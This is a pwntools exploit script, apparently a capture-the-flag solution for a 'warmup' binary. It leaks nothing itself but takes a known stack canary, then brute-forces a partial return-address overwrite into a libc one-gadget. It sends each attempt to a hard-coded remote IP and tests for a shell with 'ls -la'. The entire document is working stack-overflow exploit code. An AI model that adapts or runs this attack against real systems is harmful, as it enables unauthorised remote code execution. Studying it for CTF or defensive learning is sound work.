from pwn import *

context.binary = exe = ELF('./warmup')
libc = ELF('./libc.so.6')

PORT = int(input("Give PORT: "))

canary = int(input("Give Canary: "), 16)
log.info(f'Canary: {hex(canary)}')

one = 0x4e8a0
libc_call_main = 0x23a90
offset = one - libc_call_main


pos_hex = '0123456789abcdef'

pos_ret = []
pos_sys = []

for a in pos_hex:
    for b in pos_hex:
        for c in pos_hex:
            pos_ret.append(a + b + c + 'a90')

for pos in pos_ret:
    pos_sys.append(hex(int(pos, 16) + offset))

found = False

for pos in pos_sys:
    pos = pos[2:]

    gud = p32(int(pos, 16))[:-1]
    if gud == b'\xa0\xe8\r':
        found = False
    if(found):
        continue
    io = remote('34.76.152.107', PORT)

    payload = b'i'*56 + p64(canary) + p64(0) + gud
    print(payload)
    io.send(payload)
    io.recvall()
    try:
        io.sendline(b'ls -la')
        print(io.recvall())
        io.sendline(b'ls -la')
        print(io.recvall())
    except:
        print('bruh')
    io.close()